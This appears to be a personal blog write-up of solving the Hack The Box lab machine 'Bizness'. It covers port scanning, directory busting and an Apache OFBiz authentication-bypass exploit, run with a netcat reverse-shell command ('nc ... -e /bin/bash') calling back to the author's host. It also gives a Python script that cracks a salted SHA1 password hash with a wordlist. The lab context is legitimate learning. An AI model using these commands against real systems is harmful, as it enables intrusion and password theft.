---
tagline: bizness
title: Bizness - My First HTB machine
description: My first HTB Machine and how I solved it
banner: /blog/biznessbanner.jpeg/
banner_alt: Banner of HTB
date: '2024-02-11'
---

## Starting up 🚀

I started by installing my ovpn files and running ```sudo openvpn /Users/vipin/Downloads/lab_qvipin.ovpn```. From there you should be ready to start your machine.

## Scanning for ports

- The first step typically for machines is running a **nmap** scan.

```bash:Terminal

❯ sudo nmap -sV 10.10.11.252
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-04 10:14 EST
Nmap scan report for 10.10.11.252
Host is up (0.054s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
```

- With this port scan we now know that 22, 80, & 443 is open.

## Accessing the website

- Entering 10.10.11.252 into our browser will give us a *ERR_CONNECTION_TIMED_OUT* error so to fix this running ```echo "TARGET_IP domain.htb" | sudo tee -a /etc/hosts``` and replacing the **TARGET_IP** with our IP and **domain.htb** with our domain allows us to access the website.

## Finding Vulnerabilities

- Upon accessing the website we see a normal website.

![Image showing the main page of bizness.htb](/blog/biznesspics/biznesspage1.png 'Fig.1')

- Towards the bottom we see the website is made with **Apache OFBiz**

![Image showing apache ofbiz](/blog/biznesspics/ApacheOFBIZ1.png 'Fig.2')

- Searching for vulnerabilities associated with **Apache OFBiz** we find [this Github repo](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass).

## Directory Busting

- To look for some directories in the site, I will be using Dirsearch

```bash:Terminal
❯ dirsearch -u https://bizness.htb/ --exclude-status 404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /Users/vipin/reports/https_bizness.htb/__24-02-09_23-38-26.txt

Target: https://bizness.htb/

[23:38:26] Starting:
[23:38:30] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[23:38:31] 400 -  795B  - /a%5c.aspx
[23:38:31] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[23:38:42] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[23:38:43] 302 -    0B  - /common  ->  https://bizness.htb/common/
[23:38:44] 302 -    0B  - /content  ->  https://bizness.htb/content/
[23:38:44] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[23:38:44] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[23:38:44] 200 -   34KB - /control/
[23:38:44] 200 -   34KB - /control
[23:38:44] 200 -   11KB - /control/login
[23:38:46] 302 -    0B  - /error  ->  https://bizness.htb/error/
[23:38:46] 302 -    0B  - /example  ->  https://bizness.htb/example/
[23:38:48] 302 -    0B  - /images  ->  https://bizness.htb/images/
[23:38:49] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[23:38:59] 200 -   21B  - /solr/admin/
[23:38:59] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
[23:38:59] 302 -    0B  - /solr/  ->  https://bizness.htb/solr/control/checkLogin/

Task Completed
```

## Getting the User flag

- Looking inside accounting, we find a login page, but that seems to not matter right now.

![Image showing the login page of bizness.htb](/blog/biznesspics/loginbizness1.png 'Fig.2')

- Let's use that [POS repo](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) we found in the beginning..

```bash:Terminal 
└─$ python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.14.35 6969 -e /bin/bash"
[+] Generating payload...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.


### On another tab I am listening on port 6969

└─$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.252] 59388

``` 

- And now we have the user flag!

![Image showing the user flag](/blog/biznesspics/userflag1.png 'Fig.3')

## Getting the Root flag

- This is the most difficult part as we need to look for the Hash with the Salt, and this single handedly took almost an hour for this.

- I found the password in *c54d0.dat* 

![Image showing the password](/blog/biznesspics/rootpassword1.png 'Fig.4')

- Using the Python script below, I cracked the password

```python:Notepad

import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
       
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):

        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
      
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/Users/vipin/tech/CTFs/wordlists/rockyou.txt'

encryptor = PasswordEncryptor(hash_type)

total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  

```

![Image showing the cracked password](/blog/biznesspics/crackedpassword1.png 'Fig.5')

- And Voila!!!

![Image showing that i pwned it](/blog/biznesspics/biznesspwned.png 'Fig.6')